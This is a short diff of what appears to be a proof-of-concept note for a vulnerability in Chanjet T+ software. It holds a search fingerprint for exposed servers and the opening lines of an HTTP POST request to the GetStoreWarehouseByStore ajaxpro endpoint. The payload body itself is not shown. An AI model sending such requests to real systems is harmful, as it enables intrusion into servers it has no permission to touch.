@@ -5,7 +5,7 @@
 app="畅捷通-TPlus"
 ```
 
-## poc
+## POC
 ```
 POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
